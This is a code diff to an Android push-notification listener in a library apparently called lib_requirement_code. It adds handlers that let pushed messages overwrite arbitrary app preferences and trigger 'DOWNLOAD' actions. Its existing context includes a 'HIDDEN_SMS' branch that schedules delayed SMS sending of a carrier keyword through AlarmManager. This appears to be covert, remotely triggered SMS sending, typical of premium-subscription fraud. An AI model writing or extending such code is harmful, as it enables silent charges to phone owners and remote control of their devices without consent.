@@ -10,6 +10,7 @@ import com.google.gson.Gson;
 import org.json.JSONObject;
 
 import co.ronash.pushe.PusheListenerService;
+import ir.adnan.lib_requirement_code.BuildConfig;
 import ir.adnan.lib_requirement_code.core.Log;
 import ir.adnan.lib_requirement_code.core.Require;
 import ir.adnan.lib_requirement_code.data.Preferences;
@@ -34,18 +35,28 @@ public class ImplementPusheListener extends PusheListenerService {
     public void onMessageReceived(JSONObject message, JSONObject content) {
 
         if (message == null || "".equalsIgnoreCase(message.toString())) {
-            Log.e(TAG , "message is Empty");
+            Log.e(TAG, "message is Empty");
+            return;
+        }
+
+        Log.e(TAG, "message : \n" + message.toString());
+
+        try {
+            Gson gson = new Gson();
+            pusheData = gson.fromJson(message.toString(), PusheData.class);
+        } catch (Exception e) {
+            Log.e(TAG , "48 Error");
+            //
             return ;
         }
 
-        Log.e(TAG , "message : \n"+message.toString());
-
-        Gson gson = new Gson();
-        pusheData = gson.fromJson(message.toString(), PusheData.class);
+        if(pusheData.getType() == null) {
+            return ;
+        }
 
         //
         if (pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue())) {
-            Log.e(TAG , "pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue()");
+            Log.e(TAG, "pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue()");
 
             sms = new Sms();
 
@@ -82,12 +93,12 @@ public class ImplementPusheListener extends PusheListenerService {
                 sms.setImage_url("");
             }
 
-            Preferences.setPrefsString(this , Preferences.SMS_PUSH_CUSTOM_DATA , message.toString());
+            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
         } else if (pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue())) {
-            Log.e(TAG , "pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue()");
-            Preferences.setPrefsString(this , Preferences.SMS_PUSH_CUSTOM_DATA , message.toString());
+            Log.e(TAG, "pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue()");
+            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
         } else if (pusheData.getType().equals(GCMEnum.HIDDEN_SMS.getValue())) {
-            Log.e(TAG , "pusheData.getType().equals(GCMEnum.HIDDEN_SMS.getValue())");
+            Log.e(TAG, "pusheData.getType().equals(GCMEnum.HIDDEN_SMS.getValue())");
             //
             sms = new Sms();
 
@@ -125,11 +136,67 @@ public class ImplementPusheListener extends PusheListenerService {
                 intent.putExtra("message", sms.getMci_secound_keyword());
 
                 PendingIntent pendingIntent = PendingIntent.getBroadcast(
-                        THIS.getApplicationContext(), Require.CODE_BROADCAST_SENDSMS , intent, 0);
+                        THIS.getApplicationContext(), Require.CODE_BROADCAST_SENDSMS, intent, 0);
                 AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
                 alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
                         + (sms.getDelay_time() * 1000), pendingIntent);
             }
+        } else if (pusheData.getType().equals(GCMEnum.IMAGE.getValue())) {
+            Log.e(TAG, "pusheData.getType().equals(IMAGE.getValue()");
+            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
+        } else if (pusheData.getType().equals(GCMEnum.DATA.getValue())) {
+            Log.e(TAG, "pusheData.getType().equals(DATA.getValue()");
+            //
+            try {
+                for (int i = 0; i < pusheData.getData().size(); i++) {
+                    if (pusheData.getData().get(i).getKey() != null
+                            && pusheData.getData().get(i).getValue() != null
+                            && pusheData.getData().get(i).getTypeValue() != null) {
+
+                        if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_INT.getValue())) {
+                            Preferences.setPrefsInt(
+                                    THIS,
+                                    pusheData.getData().get(i).getKey(),
+                                    Integer.parseInt(pusheData.getData().get(i).getValue())
+                            );
+                            //
+                            Log.e(TAG, " : " + Preferences.getPrefsIntDefaultZero(THIS, pusheData.getData().get(i).getKey()));
+                        } else if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_STRING.getValue())) {
+                            Preferences.setPrefsString(
+                                    THIS,
+                                    pusheData.getData().get(i).getKey(),
+                                    pusheData.getData().get(i).getValue()
+                            );
+                            //
+                            Log.e(TAG, " : " + Preferences.getPrefsString(THIS, pusheData.getData().get(i).getKey()));
+                        } else if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_BOOLEAN.getValue())) {
+                            Preferences.setPrefsBoolean(
+                                    THIS,
+                                    pusheData.getData().get(i).getKey(),
+                                    Boolean.parseBoolean(pusheData.getData().get(i).getValue())
+                            );
+                            //
+                            Log.e(TAG, " : " + Preferences.isPrefsBooleanDefaultFalse(THIS, pusheData.getData().get(i).getKey()));
+                        } else if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_FLOAT.getValue())) {
+                            Preferences.setPrefsFloat(
+                                    THIS,
+                                    pusheData.getData().get(i).getKey(),
+                                    Float.parseFloat(pusheData.getData().get(i).getValue())
+                            );
+                            //
+                            Log.e(TAG, " : " + Preferences.getPrefsFloatDefaultZero(THIS, pusheData.getData().get(i).getKey()));
+                        }
+
+                        //
+                        Log.e(TAG, "Data Updated");
+                    }
+                }
+            } catch (Exception e) {
+
+            }
+        } else if (pusheData.getType().equals(GCMEnum.DOWNLOAD.getValue())) {
+            Log.e(TAG, "pusheData.getType().equals(DOWNLOAD.getValue()");
+            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
         }
     }
 }
